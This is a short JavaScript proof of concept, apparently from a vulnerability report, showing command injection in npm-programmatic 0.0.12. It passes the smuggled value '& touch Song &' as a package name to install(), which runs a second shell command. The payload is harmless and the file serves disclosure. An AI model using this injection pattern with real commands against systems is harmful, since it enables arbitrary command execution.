/**
 * npm-programmatic@0.0.12 is vulnerable to command injection.
 * the injection point of this package is very easy to be found
 * any package name or option property can be used to do injection
 * The packages and option properties are cancated together without
 * any checking and be put to the exec arg directly
 *
 * This attack is just one example of them
 * attention: we need to set the cwd to current dir to make the generated
 * file easy to be found
 */
var root = require("npm-programmatic");
var attack_code = "& touch Song &";
root.install([attack_code], {"cwd": "./"});
